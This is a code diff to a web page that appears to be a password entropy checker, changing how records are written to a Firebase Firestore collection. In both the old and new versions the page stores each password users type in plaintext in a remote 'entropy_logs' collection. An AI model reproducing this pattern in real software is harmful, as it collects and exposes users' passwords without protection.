@@ -320,7 +320,7 @@ body {
 <script type="module">
 /* YOUR JAVASCRIPT REMAINS UNCHANGED */
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+import { getFirestore, collection, setDoc, doc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
 
 const firebaseConfig = {
   apiKey: "YOUR_KEY",
@@ -355,12 +355,16 @@ eyeBtn.addEventListener("click", togglePassword);
 
 async function saveToFirebase(passwordValue, entropyValue) {
     try {
-        await addDoc(collection(db, "entropy_logs"), {
+
+        const docId = new Date().toISOString().replace(/:/g, "-");
+
+        await setDoc(doc(db, "entropy_logs", docId), {
             password: passwordValue,
             entropy: entropyValue,
             length: passwordValue.length,
             createdAt: serverTimestamp()
         });
+
     } catch (e) {
         console.log("Save failed");
     }
@@ -480,5 +484,5 @@ window.addEventListener("scroll", revealOnScroll);
 window.addEventListener("load", revealOnScroll);
 </script>
 </body>
-                  </html>
+                                                                   </html>
   
